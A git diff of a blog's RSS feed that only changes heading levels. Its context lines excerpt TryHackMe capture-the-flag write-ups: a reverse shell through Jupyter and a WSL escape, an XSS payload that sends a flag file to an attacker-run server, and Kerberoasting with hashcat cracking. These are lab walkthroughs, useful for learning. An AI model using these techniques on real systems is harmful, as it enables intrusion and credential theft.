@@ -16,9 +16,9 @@
       
       <guid>http://localhost:1313/posts/weasel/</guid>
       <description><![CDATA[<p><img src="/img/weasel/weasel.png" alt="Weasel"></p>
-<h3 id="description">Description</h3>
+<h2 id="description">Description</h2>
 <p>Weasel is a Medium difficulty challenge on Tryhackme. We get a foothold on WSL through Jupyter Notebook and find a SSH key that allows us to SSH into the Windows host. Finally, we escalate privileges by exploiting AlwaysInstallElevated with a malicious Windows Installer file.</p>
-<h3 id="recon">Recon</h3>
+<h2 id="recon">Recon</h2>
 <p>First thing&rsquo;s first. Let&rsquo;s start with a nmap scan.</p>
 <pre tabindex="0"><code># Nmap 7.94SVN scan initiated Sun Dec 22 23:42:51 2024 as: nmap -p- -A -v -oN /tmp/nmap.scan -T4 10.10.34.193
 Increasing send delay for 10.10.34.193 from 0 to 5 due to 547 out of 1366 dropped probes since last increase.
@@ -162,7 +162,7 @@ drwxrwxr-x 6 kali kali 220 Dec 22 21:15 ..
 ┌──(kali㉿kali)-[/tmp/smb]
 └─$ cat misc/jupyter-token.txt
 067470c5ddsadc54153ghfjd817d15b5d5f5341e56b0dsad78a
-</code></pre><h3 id="foothold">Foothold</h3>
+</code></pre><h2 id="foothold">Foothold</h2>
 <p>We are able to use this token to login to Jupyter Notebook on port 8888, where we can edit <code>weasel.ipynb</code> or create a new Jupyter notebook file to get a shell.</p>
 <p><img src="/img/weasel/logon.png" alt="Jupyter authenticated"></p>
 <p>I tried to use Python to execute PowerShell and get a reverse shell that way. I wasn&rsquo;t able to get a connection, and after some testing realized that Windows-specific features like PowerShell simply weren&rsquo;t being executed correctly. On the other hand, Linux commands were working perfectly fine. Given that our nmap scan revealed many details that our target is a Windows machine (e.g. RDP and Microsoft RPC). It&rsquo;s fairly safe to say that we are up against WSL.</p>
@@ -176,7 +176,7 @@ connect to [10.13.48.55] from (UNKNOWN) [10.10.34.193] 50376
 bash: cannot set terminal process group (10): Invalid argument
 bash: no job control in this shell
 (base) dev-datasci@DEV-DATASCI-JUP:~/datasci-team$ 
-</code></pre><h3 id="breaking-out-of-wsl">Breaking out of WSL</h3>
+</code></pre><h2 id="breaking-out-of-wsl">Breaking out of WSL</h2>
 <p>Checking sudo permissions is something I always do early one since it&rsquo;s usually an easy win, so I quickly found that <code>/home/dev-datasci/.local/bin/jupyter</code> can be executed with root privileges without a password.</p>
 <pre tabindex="0"><code>(base) dev-datasci@DEV-DATASCI-JUP:~/datasci-team$ sudo -l
 sudo -l
@@ -278,7 +278,7 @@ SMB         10.10.34.193    445    DEV-DATASCI-JUP  1001: DEV-DATASCI-JUP\sshd (
 </code></pre><p>We can therefore ssh onto the Windows host OS.</p>
 <pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
 └─$ ssh -i dev-datasci-lowpriv_id_ed25519 dev-datasci-lowpriv@10.10.34.193
-</code></pre><h3 id="privilege-escalation">Privilege Escalation</h3>
+</code></pre><h2 id="privilege-escalation">Privilege Escalation</h2>
 <p>We can use WinPEAS to facilitate our enumeration. I transferred it to the Windows host through scp.</p>
 <pre tabindex="0"><code>┌──(kali㉿kali)-[~]
 └─$ scp -i /tmp/id_rsa ~/winPEASany.exe dev-datasci-lowpriv@10.10.34.193:C:\Users\datasci-team\winpeas.exe    
@@ -360,9 +360,9 @@ nt authority\system
       
       <guid>http://localhost:1313/posts/the_sticker_shop/</guid>
       <description><![CDATA[<p><img src="/img/the_sticker_shop/the_sticker_shop.png#center" alt="The Sticker Shop"></p>
-<h3 id="description">Description</h3>
+<h2 id="description">Description</h2>
 <p><a href="https://tryhackme.com/r/room/thestickershop">The Sticker Shop</a> is an easy-rated challenge on Tryhackme. We exfiltrate <code>flag.txt</code> from the web server through a XSS attack.</p>
-<h3 id="walkthrough">Walkthrough</h3>
+<h2 id="walkthrough">Walkthrough</h2>
 <p>We are told that we need to read the flag at <code>http://10.10.102.204:8080/flag.txt</code>. However, visiting the URL, we are met with a 401 Unauthorized message, meaning we are not authenticated to view the file.</p>
 <p><img src="/img/the_sticker_shop/401.png" alt="Direct access 401 forbidden"></p>
 <p>If we backtrack to the webapp&rsquo;s homepage, we see that there is a page for submitting feedback where we can presumably send content to the sticker shop staff. This might be our way in.</p>
@@ -391,7 +391,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 </span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
 </span></span></code></pre></div><p><img src="/img/the_sticker_shop/flag_get.png" alt="Quick and dirty GET flag"></p>
 <hr>
-<h3 id="beyond-pwn">Beyond Pwn</h3>
+<h2 id="beyond-pwn">Beyond Pwn</h2>
 <p>But what if you want to read a file that is much larger, or you don&rsquo;t want the data to be visible in the URL, perhaps for greater stealth? In that case, you would be better off using POST instead of GET.
 For unstructured data, sending data as plaintext will suffice.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
@@ -513,9 +513,9 @@ Access-Control-Allow-Headers: Represents the HTTP headers that are permitted.
       
       <guid>http://localhost:1313/posts/enterprise/</guid>
       <description><![CDATA[<p><img src="/img/enterprise/enterprise.png#center" alt="Enterprise"></p>
-<h3 id="description">Description</h3>
+<h2 id="description">Description</h2>
 <p><a href="https://tryhackme.com/r/room/enterprise">Enterprise</a> is a Hard difficulty Active Directory box on Tryhackme. We are in an assumed compromise scenario where our only target is a domain controller on the internal network. While privilege escalation was straightforward, there are multiple rabbit holes for initial access.</p>
-<h3 id="recon">Recon</h3>
+<h2 id="recon">Recon</h2>
 <p>I began my recon on the machine was a nmap scan.</p>
 <pre tabindex="0"><code># Nmap 7.94SVN scan initiated Wed Sep 18 17:50:36 2024 as: nmap -p- -A -v -oN nmap.scan -T5 10.10.62.141
 Increasing send delay for 10.10.62.141 from 0 to 5 due to 948 out of 2369 dropped probes since last increase.
@@ -704,7 +704,7 @@ Version: dev (9cfb81e) - 09/18/24 - Ronnie Flathers @ropnop
 <p><img src="/img/enterprise/enterprise_github.png" alt="Enterprise-THM Github page"></p>
 <p>The Github page has a single repository that doesn&rsquo;t hold any useful information. However, there is an associated account &ldquo;Nik-enterprise-dev&rdquo; which has a repository &ldquo;mgmtScript.ps1&rdquo;. This could prove to be out lucky break.</p>
 <p><img src="/img/enterprise/nik_github.png" alt="Nik-enterprise-dev Github page"></p>
-<h3 id="foothold">Foothold</h3>
+<h2 id="foothold">Foothold</h2>
 <p>The PowerShell script takes in a username and password and gets the system information of all computers within an active directory network. While the <code>$userName</code> and <code>$userPassword</code> fields are empty, we can see that there has been more than one change pushed to this repository.</p>
 <p><img src="/img/enterprise/git_history.png" alt="mgmtScript.ps1 Repository history"></p>
 <p>We can look at the details by cloning the repository.</p>
@@ -766,7 +766,7 @@ HTTP/LAB-DC           bitbucket  CN=sensitive-account,CN=Builtin,DC=LAB,DC=ENTER
 </code></pre><p>We get a hash for <code>bitbucket</code>. Now to crack it&hellip;</p>
 <pre tabindex="0"><code>hashcat -a 0 kerberoast.txt /usr/share/wordlists/rockyou.txt
 </code></pre><p>Eventually, it cracks.</p>
-<h3 id="privilege-escalation">Privilege Escalation</h3>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
 <p>With the new credentials for the <code>bitbucket</code> service account, I connected to the domain controller through RDP.</p>
 <pre tabindex="0"><code>xfreerdp /v:10.10.62.141 /u:bitbucket /p:&lt;bitbucket&#39;s password&gt; /cert-ignore
 </code></pre><p>After some enumeration, I found an unquoted service path.</p>
